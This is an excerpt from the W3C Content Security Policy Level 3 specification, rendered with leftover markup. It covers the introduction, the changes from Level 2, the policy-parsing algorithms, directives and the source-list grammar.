:::: section
## [1. ]{.secno}[Introduction]{.content}[](#intro){.self-link} {#intro .heading .settled level="1"}

*This section is not normative.*

This document defines [Content Security Policy]{#content-security-policy
.dfn .dfn-paneled dfn-type="dfn" export=""} (CSP), a tool which
developers can use to lock down their applications in various ways,
mitigating the risk of content injection vulnerabilities such as
cross-site scripting, and reducing the privilege with which their
applications execute.

CSP is not intended as a first line of defense against content injection
vulnerabilities. Instead, CSP is best used as defense-in-depth. It
reduces the harm that a malicious injection can cause, but it is not a
replacement for careful input validation and output encoding.

This document is an iteration on Content Security Policy Level 2, with
the goal of more clearly explaining the interactions between CSP, HTML,
and Fetch on the one hand, and providing clear hooks for modular
extensibility on the other. Ideally, this will form a stable core upon
which we can build new functionality.

### [1.1. ]{.secno}[Examples]{.content}[](#examples){.self-link} {#examples .heading .settled level="1.1"}

#### [1.1.1. ]{.secno}[Control Execution]{.content}[](#example-basic){.self-link} {#example-basic .heading .settled level="1.1.1"}

::: {#example-1a2032b4 .example}
[](#example-1a2032b4){.self-link} MegaCorp Inc's developers want to
protect themselves against cross-site scripting attacks. They can
mitigate the risk of script injection by ensuring that their trusted CDN
is the only origin from which script can load and execute. Moreover,
they wish to ensure that no plugins can execute in their pages\'
contexts. The following policy has that effect:

    Content-Security-Policy: script-src https://cdn.example.com/scripts/; object-src 'none'
:::

### [1.2. ]{.secno}[Goals]{.content}[](#goals){.self-link} {#goals .heading .settled level="1.2"}

Content Security Policy aims to do to a few related things:

1.  Mitigate the risk of content-injection attacks by giving developers
    fairly granular control over

    - The resources which can be requested (and subsequently embedded or
      executed) on behalf of a specific
      [`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document
      link-type="idl"} or
      [`Worker`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#worker){#ref-for-worker
      link-type="idl"}

    - The execution of inline script

    - Dynamic code execution (via
      [`eval()`{.idl}](https://tc39.github.io/ecma262#sec-eval-x){#ref-for-sec-eval-x
      link-type="idl"} and similar constructs)

    - The application of inline style

2.  Mitigate the risk of attacks which require a resource to be embedded
    in a malicious context (the \"Pixel Perfect\" attack described in
    [\[TIMING\]](#biblio-timing "Pixel Perfect Timing Attacks"){link-type="biblio"},
    for example) by giving developers granular control over the origins
    which can embed a given resource.

3.  Provide a policy framework which allows developers to reduce the
    privilege of their applications.

4.  Provide a reporting mechanism which allows developers to detect
    flaws being exploited in the wild.

### [1.3. ]{.secno}[Changes from Level 2]{.content}[](#changes-from-level-2){.self-link} {#changes-from-level-2 .heading .settled level="1.3"}

This document describes an evolution of the Content Security Policy
Level 2 specification
[\[CSP2\]](#biblio-csp2 "Content Security Policy Level 2"){link-type="biblio"}.
The following is a high-level overview of the changes:

1.  The specification has been rewritten from the ground up in terms of
    the [\[FETCH\]](#biblio-fetch "Fetch Standard"){link-type="biblio"}
    specification, which should make it simpler to integrate CSP's
    requirements and restrictions with other specifications (and with
    Service Workers in particular).

2.  The `child-src` model has been substantially altered:

    1.  The `frame-src` directive, which was deprecated in CSP Level 2,
        has been undeprecated, but continues to defer to `child-src` if
        not present (which defers to `default-src` in turn).

    2.  A `worker-src` directive has been added, deferring to
        `child-src` if not present (which likewise defers to
        `script-src` and eventually `default-src`).

3.  The URL matching algorithm now treats insecure schemes and ports as
    matching their secure variants. That is, the source expression
    `http://example.com:80` will match both `http://example.com:80` and
    `https://example.com:443`.

    Likewise, `'self'` now matches `https:` and `wss:` variants of the
    page's origin, even on pages whose scheme is `http`.

4.  Violation reports generated from inline script or style will now
    report \"`inline`\" as the blocked resource. Likewise, blocked
    `eval()` execution will report \"`eval`\" as the blocked resource.

5.  The `manifest-src` directive has been added.

6.  The `report-uri` directive is deprecated in favor of the new
    `report-to` directive, which relies on
    [\[REPORTING\]](#biblio-reporting "Reporting API"){link-type="biblio"}
    as infrastructure.

7.  The `'strict-dynamic'` source expression will now allow script which
    executes on a page to load more script via
    non-[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted){#ref-for-parser-inserted
    link-type="dfn"}
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script
    link-type="element"} elements. Details are in [§ 8.2 Usage of
    \"\'strict-dynamic\'\"](#strict-dynamic-usage).

8.  The `'unsafe-hashes'` source expression will now allow event
    handlers, style attributes and `javascript:` navigation targets to
    match hashes. Details in [§ 8.3 Usage of
    \"\'unsafe-hashes\'\"](#unsafe-hashes-usage).

9.  The [source
    expression](#source-expression){#ref-for-source-expression
    link-type="dfn"} matching has been changed to require explicit
    presence of any non-[HTTP(S)
    scheme](https://fetch.spec.whatwg.org/#http-scheme){#ref-for-http-scheme
    link-type="dfn"}, rather than [local
    scheme](https://fetch.spec.whatwg.org/#local-scheme){#ref-for-local-scheme
    link-type="dfn"}, unless that non-[HTTP(S)
    scheme](https://fetch.spec.whatwg.org/#http-scheme){#ref-for-http-scheme①
    link-type="dfn"} is the same as the scheme of protected resource, as
    described in [§ 6.7.2.8 Does url match expression in origin with
    redirect
    count?](#match-url-to-source-expression){#ref-for-match-url-to-source-expression}.

10. Hash-based source expressions may now match external scripts if the
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①
    link-type="element"} element that triggers the request specifies a
    set of integrity metadata which is listed in the current policy.
    Details in [§ 8.4 Allowing external JavaScript via
    hashes](#external-hash).

11. Reports generated for inline violations will contain a
    [sample](#violation-sample){#ref-for-violation-sample
    link-type="dfn"} attribute if the relevant directive contains the
    [`'report-sample'`](#grammardef-report-sample){#ref-for-grammardef-report-sample
    link-type="grammar"} expression.
::::

::: section
## [2. ]{.secno}[Framework]{.content}[](#framework){.self-link} {#framework .heading .settled level="2"}

### [2.1. ]{.secno}[Infrastructure]{.content}[](#framework-infrastructure){.self-link} {#framework-infrastructure .heading .settled level="2.1"}

This document uses ABNF grammar to specify syntax, as defined in
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}.
It also relies on the `#rule` ABNF extension defined in [Section
5.6.1](https://tools.ietf.org/html/rfc9110#section-5.6.1) of
[\[RFC9110\]](#biblio-rfc9110 "HTTP Semantics"){link-type="biblio"},
with the modification that
[OWS](https://tools.ietf.org/html/rfc9110#section-5.6.3){#ref-for-section-5.6.3
link-type="grammar"} is replaced with
[optional-ascii-whitespace](#grammardef-optional-ascii-whitespace){#ref-for-grammardef-optional-ascii-whitespace
link-type="grammar"}. That is, the `#rule` used in this document is
defined as:

    1#element => element *( optional-ascii-whitespace "," optional-ascii-whitespace element )

and for n \>= 1 and m \> 1:

    <n>#<m>element => element <n-1>*<m-1>( optional-ascii-whitespace "," optional-ascii-whitespace element )

This document depends on the Infra Standard for a number of foundational
concepts used in its algorithms and prose
[\[INFRA\]](#biblio-infra "Infra Standard"){link-type="biblio"}.

The following definitions are used to improve readability of other
definitions in this document.

    optional-ascii-whitespace = *( %x09 / %x0A / %x0C / %x0D / %x20 )
    required-ascii-whitespace = 1*( %x09 / %x0A / %x0C / %x0D / %x20 )
    ; These productions match the definition of ASCII whitespace from the INFRA standard.

### [2.2. ]{.secno}[Policies]{.content}[](#framework-policy){.self-link} {#framework-policy .heading .settled level="2.2"}

A [policy]{#content-security-policy-object .dfn .dfn-paneled
dfn-type="dfn" export="" local-lt="policy"
lt="content security policy object"} defines allowed and restricted
behaviors, and may be applied to a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①
link-type="idl"},
[`WorkerGlobalScope`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope){#ref-for-workerglobalscope
link-type="idl"}, or
[`WorkletGlobalScope`{.idl}](https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope){#ref-for-workletglobalscope
link-type="idl"}.

Each policy has an associated [directive set]{#policy-directive-set .dfn
.dfn-paneled dfn-for="policy" dfn-type="dfn" export=""}, which is an
[ordered
set](https://infra.spec.whatwg.org/#ordered-set){#ref-for-ordered-set
link-type="dfn"} of [directives](#directives){#ref-for-directives
link-type="dfn"} that define the policy's implications when applied.

Each policy has an associated [disposition]{#policy-disposition .dfn
.dfn-paneled dfn-for="policy" dfn-type="dfn" export=""}, which is either
\"`enforce`\" or \"`report`\".

Each policy has an associated [source]{#policy-source .dfn .dfn-paneled
dfn-for="policy" dfn-type="dfn" export=""}, which is either \"`header`\"
or \"`meta`\".

Each policy has an associated [self-origin]{#policy-self-origin .dfn
.dfn-paneled dfn-for="policy" dfn-type="dfn" export=""}, which is an
[origin](https://html.spec.whatwg.org/#concept-origin){#ref-for-concept-origin
link-type="dfn"} that is used when matching the
[`'self'`](#grammardef-self){#ref-for-grammardef-self
link-type="grammar"} keyword.

[Note:]{.marker} This is needed to facilitate the
[`'self'`](#grammardef-self){#ref-for-grammardef-self①
link-type="grammar"} checks of [local
scheme](https://fetch.spec.whatwg.org/#local-scheme){#ref-for-local-scheme①
link-type="dfn"} documents/workers that have inherited their policy but
have an [opaque
origin](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque){#ref-for-concept-origin-opaque
link-type="dfn"}. Most of the time this will simply be the [environment
settings
object](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object){#ref-for-environment-settings-object
link-type="dfn"}'s
[origin](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin){#ref-for-concept-settings-object-origin
link-type="dfn"}.

Multiple
[policies](#content-security-policy-object){#ref-for-content-security-policy-object
link-type="dfn"} can be applied to a single resource, and are collected
into a [list](https://infra.spec.whatwg.org/#list){#ref-for-list
link-type="dfn"} of
[policies](#content-security-policy-object){#ref-for-content-security-policy-object①
link-type="dfn"} known as a [CSP list]{#csp-list .dfn .dfn-paneled
dfn-type="dfn" export=""}.

A [CSP list](#csp-list){#ref-for-csp-list link-type="dfn"} [contains a
header-delivered Content Security
Policy]{#contains-a-header-delivered-content-security-policy .dfn
.dfn-paneled dfn-type="dfn" export=""} if it
[contains](https://infra.spec.whatwg.org/#list-contain){#ref-for-list-contain
link-type="dfn"} a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②
link-type="dfn"} whose [source](#policy-source){#ref-for-policy-source
link-type="dfn"} is \"`header`\".

A [serialized CSP]{#serialized-csp .dfn .dfn-paneled dfn-type="dfn"
export=""} is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string
link-type="dfn"} consisting of a semicolon-delimited series of
[serialized
directives](#serialized-directive){#ref-for-serialized-directive
link-type="dfn"}, adhering to the following ABNF grammar
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}:

    serialized-policy =
        serialized-directive *( optional-ascii-whitespace ";" [ optional-ascii-whitespace serialized-directive ] )

A [serialized CSP list]{#serialized-csp-list .dfn .dfn-paneled
dfn-type="dfn" export=""} is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string①
link-type="dfn"} consisting of a comma-delimited series of [serialized
CSPs](#serialized-csp){#ref-for-serialized-csp link-type="dfn"},
adhering to the following ABNF grammar
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}:

    serialized-policy-list = 1#serialized-policy
                        ; The '#' rule is the one defined in section 5.6.1 of RFC 9110
                        ; but it incorporates the modifications specified
                        ; in section 2.1 of this document.

#### [2.2.1. ]{.secno}[ Parse a serialized CSP ]{.content}[](#parse-serialized-policy){.self-link} {#parse-serialized-policy .algorithm .heading .settled algorithm="Parse a serialized CSP" level="2.2.1"}

To [parse a serialized CSP]{#abstract-opdef-parse-a-serialized-csp .dfn
.dfn-paneled dfn-type="abstract-op" export=""}, given a [byte
sequence](https://infra.spec.whatwg.org/#byte-sequence){#ref-for-byte-sequence
link-type="dfn"} or
[string](https://infra.spec.whatwg.org/#string){#ref-for-string
link-type="dfn"} `serialized`{.variable}, a
[source](#policy-source){#ref-for-policy-source① link-type="dfn"}
`source`{.variable}, and a
[disposition](#policy-disposition){#ref-for-policy-disposition
link-type="dfn"} `disposition`{.variable}, execute the following steps.

This algorithm returns a [Content Security Policy
object](#content-security-policy-object){#ref-for-content-security-policy-object③
link-type="dfn"}. If `serialized`{.variable} could not be parsed, the
object's [directive
set](#policy-directive-set){#ref-for-policy-directive-set
link-type="dfn"} will be empty.

1.  If `serialized`{.variable} is a [byte
    sequence](https://infra.spec.whatwg.org/#byte-sequence){#ref-for-byte-sequence①
    link-type="dfn"}, then set `serialized`{.variable} to be the result
    of [isomorphic
    decoding](https://infra.spec.whatwg.org/#isomorphic-decode){#ref-for-isomorphic-decode
    link-type="dfn"} `serialized`{.variable}.

2.  Let `policy`{.variable} be a new
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object④
    link-type="dfn"} with an empty [directive
    set](#policy-directive-set){#ref-for-policy-directive-set①
    link-type="dfn"}, a [source](#policy-source){#ref-for-policy-source②
    link-type="dfn"} of `source`{.variable}, and a
    [disposition](#policy-disposition){#ref-for-policy-disposition①
    link-type="dfn"} of `disposition`{.variable}.

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate
    link-type="dfn"} `token`{.variable} returned by [strictly
    splitting](https://infra.spec.whatwg.org/#strictly-split){#ref-for-strictly-split
    link-type="dfn"} `serialized`{.variable} on the U+003B SEMICOLON
    character (`;`):

    1.  [Strip leading and trailing ASCII
        whitespace](https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace){#ref-for-strip-leading-and-trailing-ascii-whitespace
        link-type="dfn"} from `token`{.variable}.

    2.  If `token`{.variable} is an empty string, or if
        `token`{.variable} is not an [ASCII
        string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string②
        link-type="dfn"},
        [continue](https://infra.spec.whatwg.org/#iteration-continue){#ref-for-iteration-continue
        link-type="dfn"}.

    3.  Let `directive name`{.variable} be the result of [collecting a
        sequence of code
        points](https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points){#ref-for-collect-a-sequence-of-code-points
        link-type="dfn"} from `token`{.variable} which are not [ASCII
        whitespace](https://infra.spec.whatwg.org/#ascii-whitespace){#ref-for-ascii-whitespace①
        link-type="dfn"
        refhint-key="https://infra.spec.whatwg.org/#ascii-whitespace"}.

    4.  Set `directive name`{.variable} to be the result of running
        [ASCII
        lowercase](https://infra.spec.whatwg.org/#ascii-lowercase){#ref-for-ascii-lowercase
        link-type="dfn"} on `directive name`{.variable}.

        [Note:]{.marker} Directive names are case-insensitive, that is:
        `script-SRC 'none'` and `ScRiPt-sRc 'none'` are equivalent.

    5.  If `policy`{.variable}'s [directive
        set](#policy-directive-set){#ref-for-policy-directive-set②
        link-type="dfn"} contains a
        [directive](#directives){#ref-for-directives① link-type="dfn"}
        whose [name](#directive-name){#ref-for-directive-name
        link-type="dfn"} is `directive name`{.variable},
        [continue](https://infra.spec.whatwg.org/#iteration-continue){#ref-for-iteration-continue①
        link-type="dfn"}.

        [Note:]{.marker} In this case, the user agent SHOULD notify
        developers that a duplicate directive was ignored. A console
        warning might be appropriate, for example.

    6.  Let `directive value`{.variable} be the result of [splitting
        `token`{.variable} on ASCII
        whitespace](https://infra.spec.whatwg.org/#split-on-ascii-whitespace){#ref-for-split-on-ascii-whitespace
        link-type="dfn"}.

    7.  Let `directive`{.variable} be a new
        [directive](#directives){#ref-for-directives② link-type="dfn"}
        whose [name](#directive-name){#ref-for-directive-name①
        link-type="dfn"} is `directive name`{.variable}, and
        [value](#directive-value){#ref-for-directive-value
        link-type="dfn"} is `directive value`{.variable}.

    8.  [Append](https://infra.spec.whatwg.org/#set-append){#ref-for-set-append
        link-type="dfn"} `directive`{.variable} to `policy`{.variable}'s
        [directive
        set](#policy-directive-set){#ref-for-policy-directive-set③
        link-type="dfn"}.

4.  Return `policy`{.variable}.

#### [2.2.2. ]{.secno}[ Parse `response`{.variable}'s Content Security Policies ]{.content}[](#parse-response-csp){#ref-for-parse-response-csp .self-link} {#parse-response-csp .algorithm .dfn-paneled .heading .settled algorithm="Parse response’s Content Security Policies" dfn-type="dfn" export="" level="2.2.2" lt="Parse response’s Content Security Policies"}

To [parse a response's Content Security
Policies]{#abstract-opdef-parse-a-responses-content-security-policies
.dfn .dfn-paneled dfn-type="abstract-op" export=""} given a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response
link-type="dfn"} `response`{.variable}, execute the following steps.

This algorithm returns a
[list](https://infra.spec.whatwg.org/#list){#ref-for-list①
link-type="dfn"} of [Content Security Policy
objects](#content-security-policy-object){#ref-for-content-security-policy-object⑤
link-type="dfn"}. If the policies cannot be parsed, the returned list
will be empty.

1.  Let `policies`{.variable} be an empty
    [list](https://infra.spec.whatwg.org/#list){#ref-for-list②
    link-type="dfn"}.

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①
    link-type="dfn"} `token`{.variable} returned by [extracting header
    list
    values](https://fetch.spec.whatwg.org/#extract-header-list-values){#ref-for-extract-header-list-values
    link-type="dfn"} given `Content-Security-Policy` and
    `response`{.variable}'s [header
    list](https://fetch.spec.whatwg.org/#concept-response-header-list){#ref-for-concept-response-header-list
    link-type="dfn"}:

    1.  Let `policy`{.variable} be the result of
        [parsing](#abstract-opdef-parse-a-serialized-csp){#ref-for-abstract-opdef-parse-a-serialized-csp
        link-type="abstract-op"} `token`{.variable}, with a
        [source](#policy-source){#ref-for-policy-source③
        link-type="dfn"} of \"`header`\", and a
        [disposition](#policy-disposition){#ref-for-policy-disposition②
        link-type="dfn"} of \"`enforce`\".

    2.  If `policy`{.variable}'s [directive
        set](#policy-directive-set){#ref-for-policy-directive-set④
        link-type="dfn"} is not empty, append `policy`{.variable} to
        `policies`{.variable}.

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②
    link-type="dfn"} `token`{.variable} returned by [extracting header
    list
    values](https://fetch.spec.whatwg.org/#extract-header-list-values){#ref-for-extract-header-list-values①
    link-type="dfn"} given `Content-Security-Policy-Report-Only` and
    `response`{.variable}'s [header
    list](https://fetch.spec.whatwg.org/#concept-response-header-list){#ref-for-concept-response-header-list①
    link-type="dfn"}:

    1.  Let `policy`{.variable} be the result of
        [parsing](#abstract-opdef-parse-a-serialized-csp){#ref-for-abstract-opdef-parse-a-serialized-csp①
        link-type="abstract-op"} `token`{.variable}, with a
        [source](#policy-source){#ref-for-policy-source④
        link-type="dfn"} of \"`header`\", and a
        [disposition](#policy-disposition){#ref-for-policy-disposition③
        link-type="dfn"} of \"`report`\".

    2.  If `policy`{.variable}'s [directive
        set](#policy-directive-set){#ref-for-policy-directive-set⑤
        link-type="dfn"} is not empty, append `policy`{.variable} to
        `policies`{.variable}.

4.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③
    link-type="dfn"} `policy`{.variable} of `policies`{.variable}:

    1.  Set `policy`{.variable}'s
        [self-origin](#policy-self-origin){#ref-for-policy-self-origin
        link-type="dfn"} to `response`{.variable}'s
        [url](https://fetch.spec.whatwg.org/#concept-response-url){#ref-for-concept-response-url
        link-type="dfn"}'s
        [origin](https://url.spec.whatwg.org/#concept-url-origin){#ref-for-concept-url-origin
        link-type="dfn"}.

5.  Return `policies`{.variable}.

[Note:]{.marker} When [parsing a response's Content Security
Policies](#abstract-opdef-parse-a-responses-content-security-policies){#ref-for-abstract-opdef-parse-a-responses-content-security-policies
link-type="abstract-op"}, if the resulting `policies`{.variable} end up
containing at least one item, user agents can hold a flag on
`policies`{.variable} and use it to optimize away the [contains a
header-delivered Content Security
Policy](#contains-a-header-delivered-content-security-policy){#ref-for-contains-a-header-delivered-content-security-policy
link-type="dfn"} algorithm.

### [2.3. ]{.secno}[Directives]{.content}[](#framework-directives){.self-link} {#framework-directives .heading .settled level="2.3"}

Each
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥
link-type="dfn"} contains an [ordered
set](https://infra.spec.whatwg.org/#ordered-set){#ref-for-ordered-set①
link-type="dfn"} of [directives]{#directives .dfn .dfn-paneled
dfn-type="dfn" export=""} (its [directive
set](#policy-directive-set){#ref-for-policy-directive-set⑥
link-type="dfn"}), each of which controls a specific behavior. The
directives defined in this document are described in detail in [§ 6
Content Security Policy Directives](#csp-directives).

Each [directive](#directives){#ref-for-directives③ link-type="dfn"} is a
[name]{#directive-name .dfn .dfn-paneled dfn-for="directive"
dfn-type="dfn" export=""} / [value]{#directive-value .dfn .dfn-paneled
dfn-for="directive" dfn-type="dfn" export=""} pair. The
[name](#directive-name){#ref-for-directive-name② link-type="dfn"} is a
non-empty
[string](https://infra.spec.whatwg.org/#string){#ref-for-string①
link-type="dfn"}, and the
[value](#directive-value){#ref-for-directive-value① link-type="dfn"} is
a
[set](https://infra.spec.whatwg.org/#ordered-set){#ref-for-ordered-set②
link-type="dfn"} of non-empty
[strings](https://infra.spec.whatwg.org/#string){#ref-for-string②
link-type="dfn"}. The
[value](#directive-value){#ref-for-directive-value② link-type="dfn"} MAY
be
[empty](https://infra.spec.whatwg.org/#list-is-empty){#ref-for-list-is-empty
link-type="dfn"}.

A [serialized directive]{#serialized-directive .dfn .dfn-paneled
dfn-type="dfn" export=""} is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string③
link-type="dfn"}, consisting of one or more whitespace-delimited tokens,
and adhering to the following ABNF
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}:

    serialized-directive = directive-name [ required-ascii-whitespace directive-value ]
    directive-name       = 1*( ALPHA / DIGIT / "-" )
    directive-value      = *( required-ascii-whitespace / ( %x21-%x2B / %x2D-%x3A / %x3C-%x7E ) )
                           ; Directive values may contain whitespace and VCHAR characters,
                           ; excluding ";" and ",". The second half of the definition
                           ; above represents all VCHAR characters (%x21-%x7E)
                           ; without ";" and "," (%x3B and %x2C respectively)

    ; ALPHA, DIGIT, and VCHAR are defined in Appendix B.1 of RFC 5234.

[Directives](#directives){#ref-for-directives④ link-type="dfn"} have a
number of associated algorithms:

1.  A [pre-request check]{#directive-pre-request-check .dfn .dfn-paneled
    dfn-for="directive" dfn-type="dfn" export=""}, which takes a
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request
    link-type="dfn"} and a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦
    link-type="dfn"} as an argument, and is executed during [§ 4.1.2
    Should request be blocked by Content Security
    Policy?](#should-block-request){#ref-for-should-block-request}. This
    algorithm returns \"`Allowed`\" unless otherwise specified.

2.  A [post-request check]{#directive-post-request-check .dfn
    .dfn-paneled dfn-for="directive" dfn-type="dfn" export=""}, which
    takes a
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①
    link-type="dfn"}, a
    [response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①
    link-type="dfn"}, and a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object⑧
    link-type="dfn"} as arguments, and is executed during [§ 4.1.3
    Should response to request be blocked by Content Security
    Policy?](#should-block-response){#ref-for-should-block-response}.
    This algorithm returns \"`Allowed`\" unless otherwise specified.

3.  An [inline check]{#directive-inline-check .dfn .dfn-paneled
    dfn-for="directive" dfn-type="dfn" export=""}, which takes an
    [`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element
    link-type="idl"}, a type string, a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object⑨
    link-type="dfn"}, and a source string as arguments, and is executed
    during [§ 4.2.3 Should element's inline type behavior be blocked by
    Content Security
    Policy?](#should-block-inline){#ref-for-should-block-inline} and
    during [§ 4.2.4 Should navigation request of type be blocked by
    Content Security
    Policy?](#should-block-navigation-request){#ref-for-should-block-navigation-request}
    for `javascript:` requests. This algorithm returns \"`Allowed`\"
    unless otherwise specified.

4.  An [initialization]{#directive-initialization .dfn .dfn-paneled
    dfn-for="directive" dfn-type="dfn" export=""}, which takes a
    [`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document②
    link-type="idl"} or [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object
    link-type="dfn"} and a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object①⓪
    link-type="dfn"} as arguments. This algorithm is executed during
    [§ 4.2.1 Run CSP initialization for a
    Document](#run-document-csp-initialization){#ref-for-run-document-csp-initialization}
    and [§ 4.2.6 Run CSP initialization for a global
    object](#run-global-object-csp-initialization){#ref-for-run-global-object-csp-initialization}.
    Unless otherwise specified, it has no effect and it returns
    \"`Allowed`\".

5.  A [pre-navigation check]{#directive-pre-navigation-check .dfn
    .dfn-paneled dfn-for="directive" dfn-type="dfn" export=""}, which
    takes a
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②
    link-type="dfn"}, a navigation type string (\"`form-submission`\" or
    \"`other`\"), and a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object①①
    link-type="dfn"} as arguments, and is executed during [§ 4.2.4
    Should navigation request of type be blocked by Content Security
    Policy?](#should-block-navigation-request){#ref-for-should-block-navigation-request①}.
    It returns \"`Allowed`\" unless otherwise specified.

6.  A [navigation response check]{#directive-navigation-response-check
    .dfn .dfn-paneled dfn-for="directive" dfn-type="dfn" export=""},
    which takes a
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③
    link-type="dfn"}, a navigation type string (\"`form-submission`\" or
    \"`other`\"), a
    [response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②
    link-type="dfn"}, a
    [navigable](https://html.spec.whatwg.org/#navigable){#ref-for-navigable
    link-type="dfn"}, a check type string (\"`source`\" or
    \"`response`\"), and a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object①②
    link-type="dfn"} as arguments, and is executed during [§ 4.2.5
    Should navigation response to navigation request of type in target
    be blocked by Content Security
    Policy?](#should-block-navigation-response){#ref-for-should-block-navigation-response}.
    It returns \"`Allowed`\" unless otherwise specified.

7.  A [webrtc pre-connect check]{#directive-webrtc-pre-connect-check
    .dfn .dfn-paneled dfn-for="directive" dfn-type="dfn" export=""},
    which takes a
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object①③
    link-type="dfn"}, and is executed during [§ 4.3.1 Should RTC
    connections be blocked for global?](#should-block-rtc-connection).
    It returns \"`Allowed`\" unless otherwise specified.

#### [2.3.1. ]{.secno}[Source Lists]{.content}[](#framework-directive-source-list){.self-link} {#framework-directive-source-list .heading .settled level="2.3.1"}

Many [directives](#directives){#ref-for-directives⑤ link-type="dfn"}\'
[value](#directive-value){#ref-for-directive-value③ link-type="dfn"}
consist of [source lists]{#source-lists .dfn .dfn-paneled dfn-type="dfn"
export=""}:
[sets](https://infra.spec.whatwg.org/#ordered-set){#ref-for-ordered-set③
link-type="dfn"} of
[strings](https://infra.spec.whatwg.org/#string){#ref-for-string③
link-type="dfn"} which identify content that can be fetched and
potentially embedded or executed. Each
[string](https://infra.spec.whatwg.org/#string){#ref-for-string④
link-type="dfn"} represents one of the following types of [source
expression]{#source-expression .dfn .dfn-paneled dfn-type="dfn"
export="" lt="source expression"}:

1.  Keywords such as
    [`'none'`](#grammardef-none){#ref-for-grammardef-none
    link-type="grammar"} and
    [`'self'`](#grammardef-self){#ref-for-grammardef-self②
    link-type="grammar"} (which match nothing and the current URL's
    origin, respectively)

2.  Serialized URLs such as `https://example.com/path/to/file.js` (which
    matches a specific file) or `https://example.com/` (which matches
    everything on that origin)

3.  Schemes such as `https:` (which matches any resource having the
    specified scheme)

4.  Hosts such as `example.com` (which matches any resource on the host,
    regardless of scheme) or `*.example.com` (which matches any resource
    on the host's subdomains (and any of its subdomains\' subdomains,
    and so on))

5.  Nonces such as `'nonce-ch4hvvbHDpv7xCSvXCs3BrNggHdTzxUA'` (which can
    match specific elements on a page)

6.  Digests such as `'sha256-abcd...'` (which can match specific
    elements on a page)

A [serialized source list]{#serialized-source-list .dfn .dfn-paneled
dfn-type="dfn" export=""} is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string④
link-type="dfn"}, consisting of a whitespace-delimited series of [source
expressions](#source-expression){#ref-for-source-expression①
link-type="dfn"}, adhering to the following ABNF grammar
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}:

    serialized-source-list = ( source-expression *( required-ascii-whitespace source-expression ) ) / "'none'"
    source-expression      = scheme-source / host-source / keyword-source
                             / nonce-source / hash-source

    ; Schemes: "https:" / "custom-scheme:" / "another.custom-scheme:"
    scheme-source = scheme-part ":"

    ; Hosts: "example.com" / "*.example.com" / "https://*.example.com:12/path/to/file.js"
    host-source = [ scheme-part "://" ] host-part [ ":" port-part ] [ path-part ]
    scheme-part = scheme
                  ; scheme is defined in section 3.1 of RFC 3986.
    host-part   = "*" / [ "*." ] 1*host-char *( "." 1*host-char ) [ "." ]
    host-char   = ALPHA / DIGIT / "-"
    port-part   = 1*DIGIT / "*"
    path-part   = path-absolute (but not including ";" or ",")
                  ; path-absolute is defined in section 3.3 of RFC 3986.

    ; Keywords:
    keyword-source = "'self'" / "'unsafe-inline'" / "'unsafe-eval'"
                     / "'strict-dynamic'" / "'unsafe-hashes'"
                     / "'report-sample'" / "'unsafe-allow-redirects'"
                     / "'wasm-unsafe-eval'" / "'trusted-types-eval'"
                     / "'report-sha256'" / "'report-sha384'"
                     / "'report-sha512'"

    ISSUE: Bikeshed unsafe-allow-redirects.

    ; Nonces: 'nonce-[nonce goes here]'
    nonce-source  = "'nonce-" base64-value "'"
    base64-value  = 1*( ALPHA / DIGIT / "+" / "/" / "-" / "_" )*2( "=" )

    ; Digests: 'sha256-[digest goes here]'
    hash-source    = "'" hash-algorithm "-" base64-value "'"
